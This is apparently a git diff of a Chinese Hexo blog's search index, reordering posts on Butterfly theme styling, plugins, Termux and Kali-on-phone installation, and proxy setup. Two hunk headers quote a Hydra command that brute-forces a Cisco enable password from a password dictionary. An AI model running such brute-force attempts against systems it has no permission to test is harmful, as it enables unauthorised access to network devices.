+<p>相关含义小冰老师解释的很详细<br><a href="https://zfe.space/post/hexo-swiper.html">https://zfe.space/post/hexo-swiper.html</a></p>
+</blockquote>
+<h3 id="最后在文章中加入以下内容"><a href="#最后在文章中加入以下内容" class="headerlink" title="最后在文章中加入以下内容"></a>最后在文章中加入以下内容</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">swiper_index: 8</span><br><span class="line">swiper_desc: 简单好用的 hexo 博客文章置顶插件！</span><br><span class="line">swiper_cover: /images/letter/p.png</span><br></pre></td></tr></table></figure>
+<p>最后一行可不写，默认使用文章封面</p>
+<h2 id="主题色"><a href="#主题色" class="headerlink" title="主题色"></a>主题色</h2><p>修改以下内容即可</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim themes/butterfly/_config.yml</span><br><span class="line"></span><br><span class="line"> theme_color:</span><br><span class="line">   enable: true</span><br><span class="line">   main: &quot;#49B1F5&quot;</span><br><span class="line">   paginator: &quot;#00c4b6&quot;</span><br><span class="line">   button_hover: &quot;#FF7242&quot;</span><br><span class="line">   text_selection: &quot;#00c4b6&quot;</span><br><span class="line">   link_color: &quot;#99a9bf&quot;</span><br><span class="line">   meta_color: &quot;#858585&quot;</span><br><span class="line">   hr_color: &quot;#A4D8FA&quot;</span><br><span class="line">   code_foreground: &quot;#F47466&quot;</span><br><span class="line">   code_background: &quot;rgba(27, 31, 35, .05)&quot;</span><br><span class="line">   toc_color: &quot;#00c4b6&quot;</span><br><span class="line">   blockquote_padding_color: &quot;#49b1f5&quot;</span><br><span class="line">   blockquote_background_color: &quot;#49b1f5&quot;</span><br><span class="line">   scrollbar_color: &quot;#49b1f5&quot;</span><br><span class="line">   meta_theme_color_light: &quot;ffffff&quot;</span><br><span class="line">   meta_theme_color_dark: &quot;#0d0d0d&quot;</span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>hexo博客</category>
+      </categories>
+      <tags>
+        <tag>博客</tag>
+        <tag>hexo</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>hexo-gitee部署</title>
     <url>/2025/06/20/hexo-gitee%E9%83%A8%E7%BD%B2/</url>
     <content><![CDATA[<h2 id="导语"><a href="#导语" class="headerlink" title="导语"></a>导语</h2><p>与github的部署方式一样，仅是代码仓库的设置有些许不同，并且gitee上需要单独开启gitee pages，并且要实名认证，目前<code>pages服务暂停了</code>。</p>
@@ -1143,36 +1182,23 @@ the next reboot or after you run partprobe(8) or kpartx(8)
       </tags>
   </entry>
   <entry>
-    <title>hexo-butterfly美化</title>
-    <url>/2024/08/03/hexo-butterfly%E7%BE%8E%E5%8C%96/</url>
-    <content><![CDATA[<h2 id="hexo博客一图流"><a href="#hexo博客一图流" class="headerlink" title="hexo博客一图流"></a>hexo博客一图流</h2><h3 id="实现效果展示"><a href="#实现效果展示" class="headerlink" title="实现效果展示"></a>实现效果展示</h3><p>头部背景与主体部分背景无缝连接<br><img src="/images/pasted-22.png" alt="upload successful"></p>
-<h3 id="实现方法"><a href="#实现方法" class="headerlink" title="实现方法"></a>实现方法</h3><p>通过开启butterfly主题留下的inject模块功能</p>
-<h4 id="添加css代码"><a href="#添加css代码" class="headerlink" title="添加css代码"></a>添加css代码</h4><p>先在主题的css文件夹中创建custom.css文件</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd themes/butterfly/source/css/</span><br></pre></td></tr></table></figure>
-<p><img src="/images/pasted-24.png" alt="upload successful"></p>
-<p>编辑让顶部背景和页脚背景透明的css文件<br>vim custom.css</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#footer &#123;</span><br><span class="line">	background: transparent !important;</span><br><span class="line">&#125;</span><br><span class="line">#page-header &#123;</span><br><span class="line">   background: transparent !important;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">#footer::before&#123;</span><br><span class="line">   background: transparent !important;</span><br><span class="line">&#125;</span><br><span class="line">#page-header::before&#123;</span><br><span class="line">   background: transparent !important;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">[data-theme＝&quot;dark&quot;] #footer::before&#123;</span><br><span class="line">   background: transparent !important;</span><br><span class="line">&#125;</span><br><span class="line">[data-theme＝&quot;dark&quot;] #page-header::before&#123;</span><br><span class="line">   background: transparent !important;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h4 id="config-yml中开启inject部分功能"><a href="#config-yml中开启inject部分功能" class="headerlink" title="_config.yml中开启inject部分功能"></a>_config.yml中开启inject部分功能</h4><p>将head部分注释取消<br><img src="/images/pasted-23.png" alt="upload successful"></p>
-<h4 id="更换背景"><a href="#更换背景" class="headerlink" title="更换背景"></a>更换背景</h4><p>vim搜索背景，更换background</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim /hexo/themes/butterfly/_config.yml</span><br></pre></td></tr></table></figure>
-<p><img src="/images/pasted-25.png" alt="upload successful"></p>
-<h3 id="效果实现"><a href="#效果实现" class="headerlink" title="效果实现"></a>效果实现</h3><h4 id="启动hexo查看效果"><a href="#启动hexo查看效果" class="headerlink" title="启动hexo查看效果"></a>启动hexo查看效果</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo clean</span><br><span class="line">hexo g</span><br><span class="line">hexo s</span><br></pre></td></tr></table></figure>
-<p>刷新页面<br><img src="/images/pasted-22.png" alt="upload successful"></p>
-<h2 id="文章封面"><a href="#文章封面" class="headerlink" title="文章封面"></a>文章封面</h2><h3 id="封面"><a href="#封面" class="headerlink" title="封面"></a>封面</h3><p>修改部分为：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim themes/butterfly/_config.yml</span><br><span class="line"></span><br><span class="line">cover:</span><br><span class="line">  #display the cover or not (是否顯示文章封面)</span><br><span class="line">  index_enable: false	#首页</span><br><span class="line">  aside_enable: false	#侧边</span><br><span class="line">  archives_enable: false#归档</span><br><span class="line">  #the position of cover in home page (封面顯示的位置)</span><br><span class="line">  #left/right/both</span><br><span class="line">  position: both</span><br><span class="line">  #When cover is not set, the default cover is displayed (當沒有設置cover時，默認的封面顯示)</span><br><span class="line">  default_cover: </span><br><span class="line">    # - https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg</span><br></pre></td></tr></table></figure>
+    <title>hexo-github贡献日历</title>
+    <url>/2025/02/12/hexo-github%E8%B4%A1%E7%8C%AE%E6%97%A5%E5%8E%86/</url>
+    <content><![CDATA[<h2 id="预览"><a href="#预览" class="headerlink" title="预览"></a>预览</h2><p><img src="/images/pasted-84.png" alt="upload successful"></p>
+<h2 id="安装依赖"><a href="#安装依赖" class="headerlink" title="安装依赖"></a>安装依赖</h2><p>执行命令</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm i hexo-githubcalendar --save</span><br></pre></td></tr></table></figure>
+<h2 id="添加配置"><a href="#添加配置" class="headerlink" title="添加配置"></a>添加配置</h2><p>要放到hexo根目录下_config.yml文件，非主题:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">githubcalendar:</span><br><span class="line">  enable: true        # 是否启用本插件</span><br><span class="line">  enable_page: /      # 要生效的页面，如 / 首页，/about/ 介绍页等</span><br><span class="line">  user: w00123   # GitHub 用户名</span><br><span class="line">  layout:</span><br><span class="line">    type: id</span><br><span class="line">    name: recent-posts</span><br><span class="line">    index: 0</span><br><span class="line">  githubcalendar_html: &#x27;&lt;div class=&quot;recent-post-item&quot; style=&quot;width:100%;height:auto;padding:10px;&quot;&gt;&lt;div id=&quot;github_loading&quot; style=&quot;width:10%;height:100%;margin:0 auto;display: block&quot;&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; xmlns:xlink=&quot;http://www.w3.org/1999/xlink&quot;  viewBox=&quot;0 0 50 50&quot; style=&quot;enable-background:new 0 0 50 50&quot; xml:space=&quot;preserve&quot;&gt;&lt;path fill=&quot;#d0d0d0&quot; d=&quot;M25.251,6.461c-10.318,0-18.683,8.365-18.683,18.683h4.068c0-8.071,6.543-14.615,14.615-14.615V6.461z&quot; transform=&quot;rotate(275.098 25 25)&quot;&gt;&lt;animateTransform attributeType=&quot;xml&quot; attributeName=&quot;transform&quot; type=&quot;rotate&quot; from=&quot;0 25 25&quot; to=&quot;360 25 25&quot; dur=&quot;0.6s&quot; repeatCount=&quot;indefinite&quot;&gt;&lt;/animateTransform&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/div&gt;&lt;div id=&quot;github_container&quot;&gt;&lt;/div&gt;&lt;/div&gt;&#x27;</span><br><span class="line">  pc_minheight: 280px</span><br><span class="line">  mobile_minheight: 0px</span><br><span class="line">  # 贡献统计的梯度色卡值，可自行调整</span><br><span class="line">  color: &quot;[&#x27;rgba(255, 255, 255, 0.3)&#x27;, &#x27;#fdcdec&#x27;, &#x27;#fc9bd9&#x27;, &#x27;#fa6ac5&#x27;, &#x27;#f838b2&#x27;, &#x27;#f5089f&#x27;, &#x27;#c4067e&#x27;, &#x27;#92055e&#x27;, &#x27;#540336&#x27;, &#x27;#48022f&#x27;, &#x27;#30021f&#x27;]&quot; </span><br><span class="line">  # 推荐填写你自建的API接口，公用api随时可能会失效</span><br><span class="line">  # api: https://github-calendar-api.meta-code.top/api</span><br><span class="line">  api: https://githubcalendarapi.shiguang666.eu.org/api</span><br><span class="line">  # 推荐下载后使用本地文件</span><br><span class="line">  # calendar_js: https://cdn.jsdelivr.net/gh/barry-flynn/hexo-github-calendar/hexo_githubcalendar.js # 在线文件，容易加载失败</span><br><span class="line">  calendar_js: /js/hexo_githubcalendar.js # 本地文件，请下载到主题文件夹的source目录下</span><br><span class="line">  plus_style: &quot;&quot;</span><br></pre></td></tr></table></figure>
 
-<h3 id="分页"><a href="#分页" class="headerlink" title="分页"></a>分页</h3><p>分页，也就是文章内中显示的下一页上一页按钮，可通过配置文章封面显示图片，也可以通过设置主题色改变其颜色。</p>
-<h2 id="置顶文章滚动页"><a href="#置顶文章滚动页" class="headerlink" title="置顶文章滚动页"></a>置顶文章滚动页</h2><h3 id="NPM-插件安装"><a href="#NPM-插件安装" class="headerlink" title="NPM 插件安装"></a>NPM 插件安装</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm i hexo-swiper-bar --save</span><br></pre></td></tr></table></figure>
-
-<h3 id="新增网站根目录-config-配置项-不是主题的"><a href="#新增网站根目录-config-配置项-不是主题的" class="headerlink" title="新增网站根目录_config 配置项 (不是主题的)"></a>新增网站根目录_config 配置项 (不是主题的)</h3><p>添加以下代码</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">swiper:</span><br><span class="line">  <span class="built_in">enable</span>: <span class="literal">true</span></span><br><span class="line">  priority: 2</span><br><span class="line">  enable_page: /</span><br><span class="line">  layout:</span><br><span class="line">    <span class="built_in">type</span>: <span class="built_in">id</span></span><br><span class="line">    name: recent-posts</span><br><span class="line">    index: 0</span><br><span class="line">  temple_html: <span class="string">&#x27;&lt;div class=&quot;recent-post-item&quot; style=&quot;height: auto;width: 100%&quot;&gt;&lt;div class=&quot;blog-slider swiper-container-fade swiper-container-horizontal&quot; id=&quot;swiper_container&quot;&gt;$&#123;temple_html_item&#125;&lt;/div&gt;&lt;/div&gt;&#x27;</span></span><br><span class="line">  plus_style: <span class="string">&quot;&quot;</span></span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>相关含义小冰老师解释的很详细<br><a href="https://zfe.space/post/hexo-swiper.html">https://zfe.space/post/hexo-swiper.html</a></p>
+<h2 id="自建api"><a href="#自建api" class="headerlink" title="自建api"></a>自建api</h2><blockquote>
+<p>github作者：<a href="https://github.com/Zfour/python_github_calendar_api?tab=readme-ov-file">https://github.com/Zfour/python_github_calendar_api?tab=readme-ov-file</a><br>测试方法未根据作者提供的url，在建好的url后加上<code>/api?user=</code></p>
 </blockquote>
-<h3 id="最后在文章中加入以下内容"><a href="#最后在文章中加入以下内容" class="headerlink" title="最后在文章中加入以下内容"></a>最后在文章中加入以下内容</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">swiper_index: 8</span><br><span class="line">swiper_desc: 简单好用的 hexo 博客文章置顶插件！</span><br><span class="line">swiper_cover: /images/letter/p.png</span><br></pre></td></tr></table></figure>
-<p>最后一行可不写，默认使用文章封面</p>
-<h2 id="主题色"><a href="#主题色" class="headerlink" title="主题色"></a>主题色</h2><p>修改以下内容即可</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim themes/butterfly/_config.yml</span><br><span class="line"></span><br><span class="line"> theme_color:</span><br><span class="line">   enable: true</span><br><span class="line">   main: &quot;#49B1F5&quot;</span><br><span class="line">   paginator: &quot;#00c4b6&quot;</span><br><span class="line">   button_hover: &quot;#FF7242&quot;</span><br><span class="line">   text_selection: &quot;#00c4b6&quot;</span><br><span class="line">   link_color: &quot;#99a9bf&quot;</span><br><span class="line">   meta_color: &quot;#858585&quot;</span><br><span class="line">   hr_color: &quot;#A4D8FA&quot;</span><br><span class="line">   code_foreground: &quot;#F47466&quot;</span><br><span class="line">   code_background: &quot;rgba(27, 31, 35, .05)&quot;</span><br><span class="line">   toc_color: &quot;#00c4b6&quot;</span><br><span class="line">   blockquote_padding_color: &quot;#49b1f5&quot;</span><br><span class="line">   blockquote_background_color: &quot;#49b1f5&quot;</span><br><span class="line">   scrollbar_color: &quot;#49b1f5&quot;</span><br><span class="line">   meta_theme_color_light: &quot;ffffff&quot;</span><br><span class="line">   meta_theme_color_dark: &quot;#0d0d0d&quot;</span><br></pre></td></tr></table></figure>]]></content>
+<div class="note red icon-padding modern"><i class="note-icon fas fa-bullhorn"></i><p>如果报错500，可根据这位时光大佬的操作修改：<a href="https://www.cnblogs.com/an-shiguang/p/18269053">https://www.cnblogs.com/an-shiguang/p/18269053</a></p>
+</div>
+
+<h2 id="记录500错误处理方法"><a href="#记录500错误处理方法" class="headerlink" title="记录500错误处理方法"></a>记录500错误处理方法</h2><h4 id="进入项目选择setting"><a href="#进入项目选择setting" class="headerlink" title="进入项目选择setting"></a>进入项目选择setting</h4><p>下拉找到<code>Node.js Version</code>修改版本为18.0<br><img src="/images/pasted-82.png" alt="upload successful"></p>
+<h4 id="重新部署"><a href="#重新部署" class="headerlink" title="重新部署"></a>重新部署</h4><p>项目中选择<code>Deployments</code>点击<code>Redeploy</code>即可<br><img src="/images/pasted-83.png" alt="upload successful"></p>
+]]></content>
       <categories>
         <category>hexo博客</category>
       </categories>
@@ -1246,32 +1272,6 @@ the next reboot or after you run partprobe(8) or kpartx(8)
       </tags>
   </entry>
   <entry>
-    <title>hexo-github贡献日历</title>
-    <url>/2025/02/12/hexo-github%E8%B4%A1%E7%8C%AE%E6%97%A5%E5%8E%86/</url>
-    <content><![CDATA[<h2 id="预览"><a href="#预览" class="headerlink" title="预览"></a>预览</h2><p><img src="/images/pasted-84.png" alt="upload successful"></p>
-<h2 id="安装依赖"><a href="#安装依赖" class="headerlink" title="安装依赖"></a>安装依赖</h2><p>执行命令</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm i hexo-githubcalendar --save</span><br></pre></td></tr></table></figure>
-<h2 id="添加配置"><a href="#添加配置" class="headerlink" title="添加配置"></a>添加配置</h2><p>要放到hexo根目录下_config.yml文件，非主题:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">githubcalendar:</span><br><span class="line">  enable: true        # 是否启用本插件</span><br><span class="line">  enable_page: /      # 要生效的页面，如 / 首页，/about/ 介绍页等</span><br><span class="line">  user: w00123   # GitHub 用户名</span><br><span class="line">  layout:</span><br><span class="line">    type: id</span><br><span class="line">    name: recent-posts</span><br><span class="line">    index: 0</span><br><span class="line">  githubcalendar_html: &#x27;&lt;div class=&quot;recent-post-item&quot; style=&quot;width:100%;height:auto;padding:10px;&quot;&gt;&lt;div id=&quot;github_loading&quot; style=&quot;width:10%;height:100%;margin:0 auto;display: block&quot;&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; xmlns:xlink=&quot;http://www.w3.org/1999/xlink&quot;  viewBox=&quot;0 0 50 50&quot; style=&quot;enable-background:new 0 0 50 50&quot; xml:space=&quot;preserve&quot;&gt;&lt;path fill=&quot;#d0d0d0&quot; d=&quot;M25.251,6.461c-10.318,0-18.683,8.365-18.683,18.683h4.068c0-8.071,6.543-14.615,14.615-14.615V6.461z&quot; transform=&quot;rotate(275.098 25 25)&quot;&gt;&lt;animateTransform attributeType=&quot;xml&quot; attributeName=&quot;transform&quot; type=&quot;rotate&quot; from=&quot;0 25 25&quot; to=&quot;360 25 25&quot; dur=&quot;0.6s&quot; repeatCount=&quot;indefinite&quot;&gt;&lt;/animateTransform&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/div&gt;&lt;div id=&quot;github_container&quot;&gt;&lt;/div&gt;&lt;/div&gt;&#x27;</span><br><span class="line">  pc_minheight: 280px</span><br><span class="line">  mobile_minheight: 0px</span><br><span class="line">  # 贡献统计的梯度色卡值，可自行调整</span><br><span class="line">  color: &quot;[&#x27;rgba(255, 255, 255, 0.3)&#x27;, &#x27;#fdcdec&#x27;, &#x27;#fc9bd9&#x27;, &#x27;#fa6ac5&#x27;, &#x27;#f838b2&#x27;, &#x27;#f5089f&#x27;, &#x27;#c4067e&#x27;, &#x27;#92055e&#x27;, &#x27;#540336&#x27;, &#x27;#48022f&#x27;, &#x27;#30021f&#x27;]&quot; </span><br><span class="line">  # 推荐填写你自建的API接口，公用api随时可能会失效</span><br><span class="line">  # api: https://github-calendar-api.meta-code.top/api</span><br><span class="line">  api: https://githubcalendarapi.shiguang666.eu.org/api</span><br><span class="line">  # 推荐下载后使用本地文件</span><br><span class="line">  # calendar_js: https://cdn.jsdelivr.net/gh/barry-flynn/hexo-github-calendar/hexo_githubcalendar.js # 在线文件，容易加载失败</span><br><span class="line">  calendar_js: /js/hexo_githubcalendar.js # 本地文件，请下载到主题文件夹的source目录下</span><br><span class="line">  plus_style: &quot;&quot;</span><br></pre></td></tr></table></figure>
-
-<h2 id="自建api"><a href="#自建api" class="headerlink" title="自建api"></a>自建api</h2><blockquote>
-<p>github作者：<a href="https://github.com/Zfour/python_github_calendar_api?tab=readme-ov-file">https://github.com/Zfour/python_github_calendar_api?tab=readme-ov-file</a><br>测试方法未根据作者提供的url，在建好的url后加上<code>/api?user=</code></p>
-</blockquote>
-<div class="note red icon-padding modern"><i class="note-icon fas fa-bullhorn"></i><p>如果报错500，可根据这位时光大佬的操作修改：<a href="https://www.cnblogs.com/an-shiguang/p/18269053">https://www.cnblogs.com/an-shiguang/p/18269053</a></p>
-</div>
-
-<h2 id="记录500错误处理方法"><a href="#记录500错误处理方法" class="headerlink" title="记录500错误处理方法"></a>记录500错误处理方法</h2><h4 id="进入项目选择setting"><a href="#进入项目选择setting" class="headerlink" title="进入项目选择setting"></a>进入项目选择setting</h4><p>下拉找到<code>Node.js Version</code>修改版本为18.0<br><img src="/images/pasted-82.png" alt="upload successful"></p>
-<h4 id="重新部署"><a href="#重新部署" class="headerlink" title="重新部署"></a>重新部署</h4><p>项目中选择<code>Deployments</code>点击<code>Redeploy</code>即可<br><img src="/images/pasted-83.png" alt="upload successful"></p>
-]]></content>
-      <categories>
-        <category>hexo博客</category>
-      </categories>
-      <tags>
-        <tag>博客</tag>
-        <tag>hexo</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>hexo-微博热搜侧边栏</title>
     <url>/2025/02/20/hexo-%E5%BE%AE%E5%8D%9A%E7%83%AD%E6%90%9C%E4%BE%A7%E8%BE%B9%E6%A0%8F/</url>
     <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>学习来自<code>Ldyer</code>，原文链接：</p>
@@ -1295,41 +1295,6 @@ the next reboot or after you run partprobe(8) or kpartx(8)
 <h3 id="加入卡片"><a href="#加入卡片" class="headerlink" title="加入卡片"></a>加入卡片</h3><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">aside:</span></span><br><span class="line"><span class="string">..........</span></span><br><span class="line">    <span class="attr">card_webinfo:</span></span><br><span class="line">        <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">        <span class="attr">post_count:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure>
 
 <h2 id="调整侧边栏顺序"><a href="#调整侧边栏顺序" class="headerlink" title="调整侧边栏顺序"></a>调整侧边栏顺序</h2><p>调整<code>sort_order</code>大小即可，数字越大越前，要把公告后的卡片都加上数字（有的资料说是越小越前，但是我测试不是，反正能用就行）</p>
-]]></content>
-      <categories>
-        <category>hexo博客</category>
-      </categories>
-      <tags>
-        <tag>博客</tag>
-        <tag>hexo</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>hexo博客安装方法</title>
-    <url>/2024/07/31/hexo%E5%8D%9A%E5%AE%A2%E5%AE%89%E8%A3%85%E6%96%B9%E6%B3%95/</url>
-    <content><![CDATA[<h2 id="termux"><a href="#termux" class="headerlink" title="termux"></a>termux</h2><h3 id="termux安装准备"><a href="#termux安装准备" class="headerlink" title="termux安装准备"></a>termux安装准备</h3><p>pkg换源</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sed -i &#x27;s@^\(deb.*stable main\)$@#\1\ndeb https://mirrors.tuna.tsinghua.edu.cn/termux/termux-packages-24 stable main@&#x27; $PREFIX/etc/apt/sources.list</span><br><span class="line"></span><br><span class="line">pkg update</span><br><span class="line"></span><br><span class="line">pkg install nodejs-lts</span><br><span class="line">pkg install git</span><br><span class="line">pkg install vim</span><br></pre></td></tr></table></figure>
-
-<p>需要在目录下运行安装</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mkdir hexo</span><br><span class="line">chmod 777 hexo</span><br><span class="line">cd hexo</span><br></pre></td></tr></table></figure>
-
-<h3 id="hexo"><a href="#hexo" class="headerlink" title="hexo"></a>hexo</h3><p>npm换源（淘宝）</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm config set registry https://registry.npmmirror.com</span><br></pre></td></tr></table></figure>
-
-<p>安装</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install hexo-cli -g</span><br><span class="line">hexo init</span><br></pre></td></tr></table></figure>
-
-<p>启动命令</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo g</span><br><span class="line">hexo s</span><br></pre></td></tr></table></figure>
-
-<h3 id="主题"><a href="#主题" class="headerlink" title="主题"></a>主题</h3><p>下载主题</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone -b master https://github.com/jerryc127/hexo-theme-butterfly.git themes/butterfly</span><br></pre></td></tr></table></figure>
-
-<p>vim编辑根目录下_config.yml中的theme：butterfly<br>vim themes&#x2F;butterfly&#x2F;_config.yml</p>
-<p>安装插件</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install hexo-renderer-pug hexo-renderer-stylus --save</span><br></pre></td></tr></table></figure>
-
-<h3 id="自定义样式"><a href="#自定义样式" class="headerlink" title="自定义样式"></a>自定义样式</h3><p>都通过修改文件themes&#x2F;butterfly&#x2F;_config.yml中的模块，根据相关备注修改模块。</p>
 ]]></content>
       <categories>
         <category>hexo博客</category>
@@ -1434,6 +1399,41 @@ hydra -m cloud -P 密码字典 IP cisco-enable
       </tags>
   </entry>
   <entry>
+    <title>hexo博客安装方法</title>
+    <url>/2024/07/31/hexo%E5%8D%9A%E5%AE%A2%E5%AE%89%E8%A3%85%E6%96%B9%E6%B3%95/</url>
+    <content><![CDATA[<h2 id="termux"><a href="#termux" class="headerlink" title="termux"></a>termux</h2><h3 id="termux安装准备"><a href="#termux安装准备" class="headerlink" title="termux安装准备"></a>termux安装准备</h3><p>pkg换源</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sed -i &#x27;s@^\(deb.*stable main\)$@#\1\ndeb https://mirrors.tuna.tsinghua.edu.cn/termux/termux-packages-24 stable main@&#x27; $PREFIX/etc/apt/sources.list</span><br><span class="line"></span><br><span class="line">pkg update</span><br><span class="line"></span><br><span class="line">pkg install nodejs-lts</span><br><span class="line">pkg install git</span><br><span class="line">pkg install vim</span><br></pre></td></tr></table></figure>
+
+<p>需要在目录下运行安装</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mkdir hexo</span><br><span class="line">chmod 777 hexo</span><br><span class="line">cd hexo</span><br></pre></td></tr></table></figure>
+
+<h3 id="hexo"><a href="#hexo" class="headerlink" title="hexo"></a>hexo</h3><p>npm换源（淘宝）</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm config set registry https://registry.npmmirror.com</span><br></pre></td></tr></table></figure>
+
+<p>安装</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install hexo-cli -g</span><br><span class="line">hexo init</span><br></pre></td></tr></table></figure>
+
+<p>启动命令</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo g</span><br><span class="line">hexo s</span><br></pre></td></tr></table></figure>
+
+<h3 id="主题"><a href="#主题" class="headerlink" title="主题"></a>主题</h3><p>下载主题</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone -b master https://github.com/jerryc127/hexo-theme-butterfly.git themes/butterfly</span><br></pre></td></tr></table></figure>
+
+<p>vim编辑根目录下_config.yml中的theme：butterfly<br>vim themes&#x2F;butterfly&#x2F;_config.yml</p>
+<p>安装插件</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install hexo-renderer-pug hexo-renderer-stylus --save</span><br></pre></td></tr></table></figure>
+
+<h3 id="自定义样式"><a href="#自定义样式" class="headerlink" title="自定义样式"></a>自定义样式</h3><p>都通过修改文件themes&#x2F;butterfly&#x2F;_config.yml中的模块，根据相关备注修改模块。</p>
+]]></content>
+      <categories>
+        <category>hexo博客</category>
+      </categories>
+      <tags>
+        <tag>博客</tag>
+        <tag>hexo</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>java-linux安装卸载</title>
     <url>/2025/02/21/java-linux%E5%88%87%E6%8D%A2%E5%AE%89%E8%A3%85%E7%89%88%E6%9C%AC/</url>
     <content><![CDATA[<h2 id="下载jdk"><a href="#下载jdk" class="headerlink" title="下载jdk"></a>下载jdk</h2><ol>
@@ -1505,30 +1505,6 @@ hydra -m cloud -P 密码字典 IP cisco-enable
       </tags>
   </entry>
   <entry>
-    <title>kali移动端（root安装，不改内核）</title>
-    <url>/2024/10/15/kali/</url>
-    <content><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>把kali安在移动端，不论部署了什么工具和环境，可以随处携带，操作不方便可以局域网电脑远程使用、vnc等等。以上是我的使用场景也是折腾的原因。</p>
-<p>其实只有root的部分是最麻烦的，这个已经有很多教程了，可以慢慢看，建议先看手机的系统架构再看具体操作方法，不然在做什么都不知道。</p>
-<p>原理这块极客湾Geekerwan我感觉是说的很好的一个老师，视频链接放下面了<br>【玩机必看！带你入坑安卓刷机，小白也能看懂的ROOT基础指南来啦！】 <a href="https://www.bilibili.com/video/BV1BY4y1H7Mc/?share_source=copy_web&vd_source=772102c618b4c4a14c10923aa0e26404">https://www.bilibili.com/video/BV1BY4y1H7Mc/?share_source=copy_web&amp;vd_source=772102c618b4c4a14c10923aa0e26404</a></p>
-<h2 id="前提"><a href="#前提" class="headerlink" title="前提"></a>前提</h2><p>肯定是需要现有一部root的手机，这个可以看我oppo root的帖子或者网上找相应方法去操作。<br>然后能科学上网，这个其实没有也没关系，但是会比较方便。<br>使用的是面具安装。</p>
-<h2 id="下载镜像"><a href="#下载镜像" class="headerlink" title="下载镜像"></a>下载镜像</h2><p>bing搜索kali，点击下载</p>
-<p><img src="/images/pasted-64.png" alt="upload successful"></p>
-<p>点击移动端，mobile</p>
-<p><img src="/images/pasted-65.png" alt="upload successful"></p>
-<p>点击full的版本，因为我这个没有对应的手机，所以下载的是图中位置的镜像</p>
-<p><img src="/images/pasted-67.png" alt="upload successful"></p>
-<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>在面具里面点击图中的本地安装，找到下载的镜像包，安装就是了<br><img src="/images/pasted-70.png" alt="upload successful"></p>
-<p>安装之后其实一切都安装好了，据说官方支持的root机会自动下载好关键的三个软件，但是我这个瞎搞的root机，没有下载，后来发现官网下载镜像那里有个软件商店可以下载。<br><img src="/images/pasted-72.png" alt="upload successful"></p>
-]]></content>
-      <categories>
-        <category>手机搞机</category>
-      </categories>
-      <tags>
-        <tag>kali</tag>
-        <tag>手机root</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>linux-代理设置方法</title>
     <url>/2025/02/08/linux-%E4%BB%A3%E7%90%86%E8%AE%BE%E7%BD%AE%E6%96%B9%E6%B3%95/</url>
     <content><![CDATA[<h2 id="centos"><a href="#centos" class="headerlink" title="centos"></a>centos</h2><h3 id="临时"><a href="#临时" class="headerlink" title="临时"></a>临时</h3><p>通过以下命令实现临时使用代理服务器：</p>
@@ -1561,23 +1537,27 @@ hydra -m cloud -P 密码字典 IP cisco-enable
       </tags>
   </entry>
   <entry>
-    <title>linux下载离线安装包</title>
-    <url>/2025/01/13/linux%E4%B8%8B%E8%BD%BD%E7%A6%BB%E7%BA%BF%E5%AE%89%E8%A3%85%E5%8C%85/</url>
-    <content><![CDATA[<h2 id="centos"><a href="#centos" class="headerlink" title="centos"></a>centos</h2><p>以wget为例，需要先下载yum-utils，再下载安装包</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum install yum-utils</span><br><span class="line">yumdownloader wget</span><br></pre></td></tr></table></figure>
-
